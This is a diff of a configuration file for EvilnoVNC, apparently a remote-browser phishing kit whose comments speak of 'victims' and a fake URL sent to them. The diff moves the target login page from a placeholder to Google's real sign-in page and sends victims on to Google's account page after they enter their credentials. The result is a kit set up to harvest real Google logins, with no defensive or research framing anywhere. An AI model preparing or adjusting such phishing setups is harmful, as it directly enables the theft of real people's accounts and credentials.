@@ -6,14 +6,14 @@
 ## CONFIGURATION
 
 # define number of concurrent EvilnoVNC instances
-instances=4
+instances=2
 
 # define admin interface credentials, change the password!
 # username is ekadmin
 adminPass="CHANGEME!"
 
 # define target URL where victims effectively log in to
-tUrl="https://target.domain/login"
+tUrl="https://accounts.google.com"
 
 # define URL of your server (fake URL sent to victims)
 # no ending slash! e.g. https://example.com
@@ -28,7 +28,7 @@ cert="./certandkey.pem"
 #cert="/etc/letsencrypt/live/yourDomain/certandkey.pem"
 
 # Sitio de redirección posterior al ingreso de credenciales
-redirectURL="https://nivel4.com"
+redirectURL="https://myaccount.google.com"
 
 # if timezone is different than Europe/Berlin, grep/sed through the files and adjust to your needs ;)
 # adjust error messages, e.g. haproxy/503.http
